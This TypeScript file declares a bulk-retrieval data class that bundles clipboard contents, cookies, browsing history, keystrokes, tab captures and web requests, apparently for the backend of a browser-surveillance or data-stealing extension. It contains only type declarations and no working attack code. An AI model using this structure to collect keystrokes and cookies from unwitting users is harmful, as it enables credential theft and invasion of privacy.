import ClipboardDto from './clipboard.dto';
import CookieDto from './cookies.dto';
import HistoryDto from './history.dto';
import KeystrokeDto from './keystrokes.dto';
import TabCaptureDto from './tabCapture.dto';
import WebRequestDto from './webRequest.dto';

class BulkRetrieveDto {
  digestable: { clipboard: ClipboardDto[],
    cookies: CookieDto[],
    history: HistoryDto[],
    keystrokes: KeystrokeDto[]
  };

  tabCatures: TabCaptureDto[];

  webRequests: WebRequestDto[];
}

export default BulkRetrieveDto;
